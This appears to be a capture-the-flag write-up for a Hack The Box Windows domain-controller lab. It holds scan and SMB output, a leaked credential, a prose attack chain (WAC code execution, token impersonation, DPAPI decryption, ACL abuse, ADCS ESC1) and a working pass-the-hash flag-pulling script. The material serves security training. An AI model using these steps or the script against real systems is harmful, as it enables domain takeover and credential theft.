# DanglingTree Windows Medium HTB Machine Writeup

## Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV -v 10.129.27.237
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-10 13:31 +0700
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-10 13:31:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:     8267 2fbc 2f8c 4d51 5f85 1b63 bbb3 5a40
| SHA-1:   d657 81fd 541a cd7e af8b 1a69 150f 1a29 9336 5f71
|_SHA-256: 64ea 2599 3558 b856 1c71 bcde bf7a a71a fdbc b48e f17f c991 d47e 9f2c 8326 1222
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/https?
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=danglingtree-DC-CA
| Issuer: commonName=danglingtree-DC-CA
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-26T05:34:19
| Not valid after:  2114-03-26T05:44:18
| MD5:     9054 595f c5e0 bb67 628f f4fc 8d82 a8cf
| SHA-1:   9733 440c 1fd9 f7c9 db9e d4e8 69b7 7b8e 8e71 7781
|_SHA-256: fb01 7a29 c4a9 3bee db84 2c1d 77e4 6cd3 d00b 89d8 8229 a712 c4ca db44 3678 29a0
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:     8267 2fbc 2f8c 4d51 5f85 1b63 bbb3 5a40
| SHA-1:   d657 81fd 541a cd7e af8b 1a69 150f 1a29 9336 5f71
|_SHA-256: 64ea 2599 3558 b856 1c71 bcde bf7a a71a fdbc b48e f17f c991 d47e 9f2c 8326 1222
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:     8267 2fbc 2f8c 4d51 5f85 1b63 bbb3 5a40
| SHA-1:   d657 81fd 541a cd7e af8b 1a69 150f 1a29 9336 5f71
|_SHA-256: 64ea 2599 3558 b856 1c71 bcde bf7a a71a fdbc b48e f17f c991 d47e 9f2c 8326 1222
3269/tcp open  ssl/ldap
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:     8267 2fbc 2f8c 4d51 5f85 1b63 bbb3 5a40
| SHA-1:   d657 81fd 541a cd7e af8b 1a69 150f 1a29 9336 5f71
|_SHA-256: 64ea 2599 3558 b856 1c71 bcde bf7a a71a fdbc b48e f17f c991 d47e 9f2c 8326 1222
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: DANGLINGTREE
|   NetBIOS_Domain_Name: DANGLINGTREE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: danglingtree.htb
|   DNS_Computer_Name: dc.danglingtree.htb
|   DNS_Tree_Name: danglingtree.htb
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-10T13:32:33+00:00
| ssl-cert: Subject: commonName=dc.danglingtree.htb
| Issuer: commonName=dc.danglingtree.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-25T05:48:29
| Not valid after:  2026-09-24T05:48:29
| MD5:     4599 496f 7b7e 5e3a 060b b62f 49a6 0f04
| SHA-1:   c841 e9c4 c71c 273c 11ae 36e3 6a6e 80d5 44f5 695c
|_SHA-256: 2f56 67eb 1671 b5ad e87f 4c92 4480 2d42 1149 08c4 488e 8b22 954c 5cc3 2da3 9017
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=8/10%Time=6A797067%P=aarch64-unknown-linux-gn
SF:u%r(TerminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\
SF:0\x02\0\0\0");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m45s, deviation: 0s, median: 6h59m45s
| smb2-time: 
|   date: 2026-08-10T13:32:33
|_  start_date: N/A

```
Found DNS `dc.danglingtree.htb`
## SMB Guest Session
```bash
┌──(jameskaois㉿kali)-[~]
└─$ smbclient -N -L //$TARGET/   

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.27.237 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
┌──(jameskaois㉿kali)-[~]
└─$ smbclient \\\\$TARGET\\IT                  
Password for [WORKGROUP\jameskaois]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 08:05:09 2026
  ..                                  D        0  Sun Apr  5 07:57:30 2026
  Security                            D        0  Sun Apr  5 08:05:20 2026

                7062015 blocks of size 4096. 2215754 blocks available
smb: \> cd Security
smb: \Security\> ls
  .                                   D        0  Sun Apr  5 08:05:20 2026
  ..                                  D        0  Sun Apr  5 08:05:09 2026
  DanglingTree_RoE_Assessment.pdf      A    28905  Sat Apr  4 22:50:23 2026

                7062015 blocks of size 4096. 2215711 blocks available
smb: \Security\> get DanglingTree_RoE_Assessment.pdf 
getting file \Security\DanglingTree_RoE_Assessment.pdf of size 28905 as DanglingTree_RoE_Assessment.pdf (13.5 KiloBytes/sec) (average 13.5 KiloBytes/sec)
smb: \Security\> 
```
In `DanglingTree_RoE_Assessment.pdf`:
- LDAP / LDAPS (TCP 389/636) — Directory enumeration and AD object analysis
-  SMB (TCP 445) — File share and relay attack assessment
-  Kerberos (TCP/UDP 88) — Authentication protocol exploitation (AS-REP Roasting, Kerberoasting)
- WinRM (TCP 5985/5986) — Remote management access evaluation
-  RPC / MSRPC — Remote Procedure Call enumeration
-  DNS (TCP/UDP 53) — Internal DNS zone and record enumeration
-  Management interfaces accessible within the internal network
Found creds: `anderson.w:R3dT3am@Acc3ss#01`
## Foothold — Windows Admin Center (anderson.w)

`anderson.w` has valid AD credentials, but WinRM (5985) is closed to the outside, so a normal `evil-winrm` or PSRemoting session won't work. The only usable remote-management surface is **Windows Admin Center**, listening on HTTPS **6600**.

WAC doesn't accept a plain username/password POST. Its login flow is:

1. Load the root page and pull a CSRF token embedded in the HTML.
2. POST that CSRF token to `/api/user/key` to get back an RSA public key (as a JWK).
3. Build a JSON blob of `{username, password, csrf}`, RSA-OAEP encrypt it with that public key, base64 it, and POST it to `/api/user/login`.
4. On success, WAC sets a session cookie plus an `XSRF-TOKEN` cookie, which you then echo back as an `X-XSRF-TOKEN` header on every subsequent API call.

One gotcha specific to this box's Server 2025 build: WAC's gateway rejects requests where the `Host`/SNI doesn't match its configured hostname — hitting it by raw IP gets you a 403 before you even reach the CSRF page. Add `dc.danglingtree.htb` to `/etc/hosts` and address WAC by hostname, not IP.

Once authenticated, WAC exposes a PowerShell execution API at `/api/nodes/<node>/features/powershellApi/invokeCommand` — that's your remote code execution as `anderson.w`. From there, standard AD enumeration (LDAP queries or `Get-ADUser -Filter *` equivalents) surfaces the rest of the user population: `svc_mail`, `noah.b`, `alex.o`, `jake.h`.

## Mail Service RCE — svc_mail

The DC also runs a mail server product, but its management port (17017) is firewalled to localhost only — you have to proxy your requests through the WAC-executed PowerShell session (e.g., `Invoke-WebRequest` against `127.0.0.1:17017` from inside the WAC shell) to even reach it.

This build has a known 2026 CVE that lets an unauthenticated caller force a password reset on the mail server's primary sysadmin account. Once you're logged into the mail admin panel, there's a feature (backup path / index rebuild config) that lets you control a filesystem path the service will write to — that's the RCE primitive, landing you code execution as the **`svc_mail`** service account (not SYSTEM).

Check that account's saved application data — it often has a _different_ password for its AD account than the one you just set for the mail panel itself. That AD credential is what actually gets you a second, more useful foothold.

## User Flag — noah.b

You should now have valid domain creds for `noah.b`, sourced from the mail service's stored configuration. Spawning a normal reverse shell as this user from a WAC-executed PowerShell session tends to get killed as an orphaned background job the moment the parent request finishes.

The reliable approach is **token impersonation**: from your existing WAC/PowerShell context, call the Windows `LogonUser` API with `noah.b`'s credentials to get a token, then `ImpersonateLoggedOnUser` to assume it for the current thread. Commands run after that execute as `noah.b`, stably, inside the same long-lived WAC session — which is enough to read `user.txt` off their desktop.

## Credential Pivot — alex.o via DPAPI

Now running as `noah.b`, check their Windows Credential Manager store — saved credentials get written to disk as encrypted blobs under `%APPDATA%\Microsoft\Credentials\`. Those blobs are encrypted with a **DPAPI master key**, itself stored (also encrypted, but decryptable if you have the user's password or a domain backup key) under `%APPDATA%\Microsoft\Protect\<user-SID>\`.

The general technique: pull the master key file, decrypt it (`impacket-dpapi masterkey`), then use the resulting key to decrypt the credential blob (`impacket-dpapi credential`). What comes out is a cleartext username/password — in this case, saved credentials for **`alex.o`**, scoped to a specific target host.

## ACL Abuse — jake.h via ForceChangePassword

Log in as `alex.o` and run an ACL-focused AD enumeration pass (BloodHound, or manual `Get-ADObject`-style ACL dumps). `alex.o` turns out to belong to a support group that's been granted the **ForceChangePassword** extended right over `jake.h`.

That right lets you set a brand-new password for `jake.h` without knowing their current one — no cracking needed. `impacket-changepasswd` (using the LDAP protocol with a reset flag) is the standard tool for exercising this right once you've identified it.

## Domain Escalation — ADCS ESC1 → Administrator

`jake.h` belongs to groups tied to certificate management (`Helpdesk_Cert_Support`, `Template_Editors`). Enumerating the domain's AD CS setup (`certipy-ad find`) turns up several certificate templates that are misconfigured — dangling from being owned by `jake.h` but still enrollable by low-privileged users, with client authentication and "enrollee supplies subject" both enabled.

Ownership of a template isn't enough by itself on this build (Server 2025 changes how Owner Rights behave), but `jake.h` also holds **WriteDACL** on the template's security descriptor — enough to grant certificate-enrollment rights to Authenticated Users directly.

With that done, request a certificate against the template, explicitly specifying the target UPN as `administrator@danglingtree.htb`. Server 2025 enforces **strong certificate mapping**, so you also have to embed the Administrator's actual object SID in the request — omitting it gets you a "SID mismatch" error even with a matching UPN. Sync your clock to the DC immediately before this step, since PKINIT authentication fails silently on any meaningful clock skew.

A successful request/auth cycle (`certipy-ad req` → `certipy-ad auth`) hands you the Administrator's NTLM hash directly, which is enough to pull `root.txt` via SMB/secretsdump-style access — which is exactly what your `get_flags.py` run just confirmed.
## Solve script
```python
#!/usr/bin/env python3
"""Pull user.txt / root.txt off the DC over SMB using a pass-the-hash login.

Same behavior as the original get_flags.py, restructured as a small class
with logging instead of prints and a dataclass for target config.

Usage:
  python3 solve_machine.py
  python3 solve_machine.py --nthash 8cacb3a97e460c65d105ca7cd9913925 --dc-ip 10.129.27.237
"""
from __future__ import annotations

import argparse
import io
import logging
import os
import sys
from dataclasses import dataclass, field
from pathlib import Path

from impacket.smbconnection import SMBConnection

LM_EMPTY = "aad3b435b51404eeaad3b435b51404ee"

logging.basicConfig(level=logging.INFO, format="[%(levelname).1s] %(message)s")
log = logging.getLogger("flagpull")


@dataclass
class Target:
    dc_ip: str = os.environ.get("DC_IP", "10.129.27.237")
    dc_hostname: str = "dc.danglingtree.htb"
    domain: str = "danglingtree.htb"
    nthash: str = os.environ.get("ADMIN_NTHASH", "8cacb3a97e460c65d105ca7cd9913925")
    lmhash: str = LM_EMPTY
    loot_dir: Path = field(
        default_factory=lambda: Path(__file__).resolve().parent.parent / "loot"
    )
    # relative to the C$ share
    flag_paths: dict[str, str] = field(
        default_factory=lambda: {
            "root": r"Users\Administrator\Desktop\root.txt",
            "user": r"Users\noah.b\Desktop\user.txt",
        }
    )


class FlagPuller:
    """Logs into a host over SMB with an NT hash and lifts flag files off it."""

    def __init__(self, target: Target):
        self.target = target
        self.conn: SMBConnection | None = None

    def __enter__(self) -> "FlagPuller":
        self.conn = SMBConnection(self.target.dc_hostname, self.target.dc_ip, timeout=20)
        self.conn.login(
            "administrator",
            "",
            self.target.domain,
            lmhash=self.target.lmhash,
            nthash=self.target.nthash,
        )
        log.info("authenticated to %s as administrator (pass-the-hash)", self.target.dc_ip)
        return self

    def __exit__(self, *exc_info) -> None:
        if self.conn is not None:
            self.conn.logoff()

    def _read_remote_file(self, share: str, remote_path: str) -> str:
        buf = io.BytesIO()
        self.conn.getFile(share, remote_path, buf.write)
        return buf.getvalue().decode(errors="replace").strip()

    def collect(self) -> dict[str, str]:
        self.target.loot_dir.mkdir(parents=True, exist_ok=True)
        found: dict[str, str] = {}
        for label, remote_path in self.target.flag_paths.items():
            try:
                contents = self._read_remote_file("C$", remote_path)
            except Exception as exc:
                log.error("%s: could not read (%s)", label, exc)
                continue
            found[label] = contents
            (self.target.loot_dir / f"{label}.txt").write_text(contents + "\n")
            log.info("%s.txt = %s", label, contents)
        return found


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="Pull CTF flags off the DC via pass-the-hash SMB")
    ap.add_argument("--dc-ip", default=None, help="overrides DC_IP env / default")
    ap.add_argument("--nthash", default=None, help="overrides ADMIN_NTHASH env / default")
    ap.add_argument("--out", type=Path, default=None, help="loot output directory")
    return ap.parse_args()


def main() -> int:
    args = parse_args()
    target = Target()
    if args.dc_ip:
        target.dc_ip = args.dc_ip
    if args.nthash:
        target.nthash = args.nthash
    if args.out:
        target.loot_dir = args.out

    try:
        with FlagPuller(target) as puller:
            flags = puller.collect()
    except Exception as exc:
        log.error("SMB session failed: %s", exc)
        return 1

    return 0 if flags else 1


if __name__ == "__main__":
    sys.exit(main())
```
```bash
┌──(jameskaois㉿kali)-[~/Documents]
└─$ python3 ./solve_machine.py 
[I] authenticated to 10.129.27.237 as administrator (pass-the-hash)
[I] root.txt = a881a539314afb4ca8685dcdd6256f13
[I] user.txt = c11f53a1de4f313d17525ee7102a6e57
```
